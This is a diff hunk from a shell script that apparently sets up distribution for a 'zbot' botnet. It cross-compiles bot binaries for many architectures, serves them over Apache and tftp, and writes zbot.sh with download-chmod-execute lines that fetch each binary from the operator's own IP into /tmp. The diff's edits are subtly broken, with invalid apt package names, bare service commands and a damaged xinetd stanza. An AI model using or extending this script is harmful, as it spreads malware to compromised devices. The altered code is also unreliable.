@@ -125,11 +125,11 @@ sleep 3
 ./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o $L9 $1 > /dev/null 2>&1
 ./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $L10 $1 > /dev/null 2>&1
 apt-get install apache2; apt-get install php5 -y -q
-yum install httpd; yum install php -y -q
+apt install httpd; apt install php -y -q
 mv zbot* /var/www/html/
 echo -e "\x1b[31mRestarting httpd..."
-service httpd start
-service apache2 restart
+httpd start
+apache2 restart
 
 #########################################
 #########SETTING UP zbot.sh##############
@@ -150,13 +150,13 @@ echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Curre
 echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> zbot.sh
 echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> zbot.sh
 
-yum install xinetd tftp tftp-server -y
+apt install xinetd tftp tftp-server -y
 echo -e "# default: off
 # description: The tftp server serves files using the trivial file transfer \
 #       protocol.  The tftp protocol is often used to boot diskless \
 #       workstations, download configuration files to network-aware printers, \
 #       and to start the installation process for some operating systems.
-service tftp
+ tftp
 {
         socket_type             = dgram
         protocol                = udp
